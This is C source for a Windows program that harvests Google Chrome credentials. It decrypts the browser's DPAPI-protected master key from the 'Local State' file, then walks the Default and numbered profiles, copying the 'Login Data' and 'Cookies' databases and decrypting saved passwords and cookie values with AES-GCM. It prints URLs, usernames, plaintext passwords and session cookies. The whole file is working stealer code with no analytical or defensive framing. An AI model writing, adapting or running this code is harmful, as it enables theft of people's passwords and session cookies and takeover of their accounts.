#include <windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include "sqlite3.h"
#include <Shlobj.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment ( lib , "bcrypt.lib")
#pragma comment (lib, "Shell32")
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DATA_BLOB Output;
HANDLE hLog = NULL;

BOOL getPath (char *ret, int id) {
	memset(ret, 0, sizeof(ret));
	if (SUCCEEDED(SHGetFolderPath(NULL, id | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, ret)))
		return TRUE;
	return FALSE;
}

VOID CharArrayToByteArray(PCHAR Char, PBYTE Byte, DWORD Length)
{
	for (DWORD dwX = 0; dwX < Length; dwX++)
	{
		Byte[dwX] = (BYTE)Char[dwX];
	}
}

char* StringRemoveSubstring(PCHAR String, CONST PCHAR Substring){
	DWORD Length = strlen(Substring);
	PCHAR pPointer = String;

	if (Length == 0){
		return NULL;
	}

	while ((pPointer = strstr(pPointer, Substring)) != NULL){
		MoveMemory(pPointer, pPointer + Length, strlen(pPointer + Length) + 1);
	}
	return String;
}

char* StringTerminateString(PCHAR String, INT Character){
	DWORD Length = strlen(String);

	for (DWORD Index = 0; Index < Length; Index++){
		if (String[Index] == Character){

			String[Index] = '\0';
			return String;
		}
	}
	return NULL;
}

char* CallbackSqlite3QueryObjectRoutine(DWORD len, char* encryptedpass)
{	
	CHAR Password[512 * 2] = { 0 };
	BYTE* Buffer = NULL;
	DWORD LenPass = len;
	BYTE* pointer = NULL;
	BCRYPT_ALG_HANDLE bCryptHandle = NULL;
	NTSTATUS Status = 0;
	BCRYPT_KEY_HANDLE phKey = NULL;
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Info;
	BCRYPT_INIT_AUTH_MODE_INFO(Info);
	ULONG DecryptPassLen = 0;
	BYTE* DecryptPass = NULL;
	ULONG DecryptSize = 0;

	DWORD nNumberOfBytesToWrite = 0;
	DWORD lpNumberOfBytesWritten = 0;

	if (LenPass < 32)
		return 0;

	CopyMemory(Password, encryptedpass, LenPass);

	Buffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LenPass);
	if (Buffer == NULL)
		goto FAILURE;

	CharArrayToByteArray(Password, Buffer, LenPass);
	pointer = Buffer;
	pointer += 3;

	Status = BCryptOpenAlgorithmProvider(&bCryptHandle, BCRYPT_AES_ALGORITHM, NULL, NULL);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Status = BCryptSetProperty(bCryptHandle, L"ChainingMode", (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 0, NULL);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Status = BCryptGenerateSymmetricKey(bCryptHandle, &phKey, NULL, 0, Output.pbData, Output.cbData, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	Info.pbNonce = pointer;
	Info.cbNonce = 12;
	Info.pbTag = (Info.pbNonce + LenPass - (3 + 16));
	Info.cbTag = 16;

	DecryptPassLen = LenPass - 3 - Info.cbNonce - Info.cbTag;
	
	DecryptPass = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptPassLen+1);

	if (DecryptPass == NULL)
		goto FAILURE;

	Status = BCryptDecrypt(phKey, (Info.pbNonce + Info.cbNonce), DecryptPassLen, &Info, NULL, 0, DecryptPass, DecryptPassLen, &DecryptSize, 0);
	if (!NT_SUCCESS(Status))
		goto FAILURE;

	if (Buffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

	if (bCryptHandle)
		BCryptCloseAlgorithmProvider(bCryptHandle, 0);

	if (phKey)
		BCryptDestroyKey(phKey);

	//if (DecryptPass)
		//HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptPass);
	DecryptPass[DecryptPassLen] = '\0';
	return DecryptPass;
	//return 1;

FAILURE:

	if (Buffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

	//if (DecryptPass)
	//	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, DecryptPass);

#pragma warning (push)
#pragma warning( disable : 4700)
	if (bCryptHandle)
		BCryptCloseAlgorithmProvider(bCryptHandle, 0);

	if (phKey)
		BCryptDestroyKey(phKey);
#pragma warning(pop)

	return 0;
}

char* getMasterKey(){
	char localStatePath[260];
	HANDLE handle;
	DWORD fsize = 0, dwBytesRead = 0, dwBufferLen = 0;
	char* localStateBuf, *substring, *pbBinary;
	DATA_BLOB Input = { 0 };

	//Reading Local State file into memory buffer
	getPath(localStatePath, CSIDL_LOCAL_APPDATA);
	strcat(localStatePath, "\\Google\\Chrome\\User Data\\Local State");
	handle = CreateFile(localStatePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (handle == INVALID_HANDLE_VALUE){
		return 0;
	}
	fsize = GetFileSize(handle, NULL);

	if (fsize == INVALID_FILE_SIZE){
		return 0;
	}
	localStateBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fsize));
	ReadFile(handle, localStateBuf, fsize, &dwBytesRead, NULL);
	CloseHandle(handle);

	//Get encrypted_key's value
	substring = localStateBuf;
	substring = strstr(substring, "\"os_crypt\":{\"encrypted_key\":\"");
	StringRemoveSubstring(substring, (PCHAR)"\"os_crypt\":{\"encrypted_key\":\"");
	StringTerminateString(substring, '"');

	//Decode base64 encoded encrypted_key's value
	CryptStringToBinaryA(substring, (DWORD)strlen(substring), CRYPT_STRING_BASE64, NULL, &dwBufferLen, NULL, NULL);
	pbBinary = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dwBufferLen));
	CryptStringToBinaryA(substring, (DWORD)strlen(substring), CRYPT_STRING_BASE64, pbBinary, &dwBufferLen, NULL, NULL);

	//Remove "DPAPI" from key and Decrypt Encrypted key's value, pbBinary - master key
	Input.cbData = dwBufferLen-5;
	Input.pbData = pbBinary+5; 
	CryptUnprotectData(&Input, 0, NULL, NULL, NULL, 0, &Output);
	Output.pbData[Output.cbData] = '\0';

	HeapFree (GetProcessHeap(), 0, pbBinary);
	HeapFree (GetProcessHeap(), 0, localStateBuf);
	return substring;
}

BOOL fetchPass(char* OriginalDBPath, char* TempDBPath){
	PCHAR Error = NULL;
	sqlite3_stmt *stmt;
	sqlite3* LoginDatabase = NULL;
	char *query = "SELECT origin_url, username_value, password_value FROM logins";
	char OriginalPath[260], TempPath[260];

	memcpy(OriginalPath, OriginalDBPath, strlen(OriginalDBPath) + 1);
	memcpy(TempPath, TempDBPath, strlen(TempDBPath) + 1);
	BOOL b = CopyFile(OriginalPath, TempPath, FALSE);
	if (!b) {
		printf("error: %d\n", GetLastError());
		return 0;
	}

	if(sqlite3_open(TempPath, &LoginDatabase) == SQLITE_OK){
		if(sqlite3_prepare_v2(LoginDatabase, query, -1, &stmt, 0) == SQLITE_OK) {

			char* out = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);
			char* pOut = out;

			getMasterKey();

			while (sqlite3_step(stmt) == SQLITE_ROW) {
				char* url = sqlite3_column_text(stmt, 0);
				char* username =  sqlite3_column_text(stmt, 1);
				char* plainTextPassword;

				plainTextPassword = CallbackSqlite3QueryObjectRoutine( sqlite3_column_bytes(stmt,2), sqlite3_column_blob(stmt, 2));
				sprintf(pOut, "Url: %s\nUser: %s\nPass: %s\n\n", url, username, plainTextPassword);
				pOut += strlen(pOut);

				if (plainTextPassword){
					HeapFree(GetProcessHeap(), 0, plainTextPassword);
				}
			}
			printf("%s",out);
			HeapFree(GetProcessHeap(), 0, out);
		}
	}
	sqlite3_finalize(stmt);

	if (LoginDatabase){
		sqlite3_close(LoginDatabase);
	}
	return 1;
}

BOOL chromePasswords(){
	HANDLE handle;
	char profile[] = "1";
	char OriginalDBPath[260], TempDBPath[260], AppDataPath[260];
	char chromeCredPath[260] = "\\Google\\Chrome\\User Data";

	getPath(AppDataPath, CSIDL_LOCAL_APPDATA);
	sprintf(TempDBPath, "%s%s",AppDataPath,"\\chrtmp_db");
	
	sprintf(OriginalDBPath, "%s%s%s", AppDataPath, chromeCredPath, "\\Default\\Login Data");
	handle = CreateFile(OriginalDBPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (handle != INVALID_HANDLE_VALUE){
		CloseHandle(handle);
		fetchPass(OriginalDBPath, TempDBPath);
		memset(OriginalDBPath, 0, 260);
	}
	while (1){
		
		handle = NULL;

		sprintf(OriginalDBPath, "%s%s%s%s%s", AppDataPath, chromeCredPath, "\\Profile ", profile, "\\Login Data");
		handle = CreateFile(OriginalDBPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (handle == INVALID_HANDLE_VALUE){
			break;
		}
		CloseHandle(handle);
		fetchPass(OriginalDBPath, TempDBPath);
		memset(OriginalDBPath, 0, 260);
		profile[0]++;
	}
	
	return TRUE;
}

BOOL fetchCookies(char* OriginalPath, char* TempPath){
	sqlite3_stmt *stmt;
	sqlite3* LoginDatabase = NULL;
	char *query = "SELECT creation_utc, host_key, name, encrypted_value, value, path, expires_utc, is_secure, last_access_utc FROM cookies";

	BOOL b = CopyFile(OriginalPath, TempPath, FALSE);

	if (!b) {
		printf("error: %d\n", GetLastError());
		return 0;
	}
	

	if(sqlite3_open(TempPath, &LoginDatabase) == SQLITE_OK){
		if(sqlite3_prepare_v2(LoginDatabase, query, -1, &stmt, 0) == SQLITE_OK) {

			char* out = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2*1024*1024);
			char* pOut = out;
			sprintf(pOut,"\n\nCookies:-- %s\n\n",OriginalPath);
			pOut += strlen(pOut);

			while (sqlite3_step(stmt) == SQLITE_ROW) {
				char *creation = sqlite3_column_text(stmt, 0);
					char *hostKey = sqlite3_column_text(stmt, 1);
					char *name = sqlite3_column_text(stmt, 2);
					char* encryptedValue;
					char *path = sqlite3_column_text(stmt,5);
					char *expires = sqlite3_column_text(stmt, 6);
					char *isSecure = sqlite3_column_text(stmt, 7);
					char *lastAccess = sqlite3_column_text(stmt, 8);

				encryptedValue = CallbackSqlite3QueryObjectRoutine( sqlite3_column_bytes(stmt,3), sqlite3_column_blob(stmt, 3));
				sprintf(pOut, "%s %s %s %s %s %s %s %s\n", creation, hostKey, name, path, expires, isSecure, lastAccess, encryptedValue);
				pOut += strlen(pOut);

				if (encryptedValue){
					HeapFree(GetProcessHeap(), 0, encryptedValue);
				}
			}
			printf("%s",out);
			HeapFree(GetProcessHeap(), 0, out);
		}
	}
	sqlite3_finalize(stmt);

	if (LoginDatabase){
		sqlite3_close(LoginDatabase);
	}
	return 1;
}

BOOL chromeCookies(){
	HANDLE handle;
	char profile[] = "1";
	char OriginalDBPath[260], TempDBPath[260], AppDataPath[260];
	char chromeCredPath[260] = "\\Google\\Chrome\\User Data";

	getPath(AppDataPath, CSIDL_LOCAL_APPDATA);
	sprintf(TempDBPath, "%s%s",AppDataPath,"\\cookies_db");
	
	sprintf(OriginalDBPath, "%s%s%s", AppDataPath, chromeCredPath, "\\Default\\Cookies");
	handle = CreateFile(OriginalDBPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (handle != INVALID_HANDLE_VALUE){
		CloseHandle(handle);
		fetchCookies(OriginalDBPath, TempDBPath);
		memset(OriginalDBPath, 0, 260);
	}
	while (1){
		
		handle = NULL;

		sprintf(OriginalDBPath, "%s%s%s%s%s", AppDataPath, chromeCredPath, "\\Profile ", profile, "\\Cookies");
		handle = CreateFile(OriginalDBPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (handle == INVALID_HANDLE_VALUE){
			break;
		}
		CloseHandle(handle);
		fetchCookies(OriginalDBPath, TempDBPath);
		memset(OriginalDBPath, 0, 260);
		profile[0]++;
	}
	
	return TRUE;
}

int main(){
	chromePasswords();
	chromeCookies();
}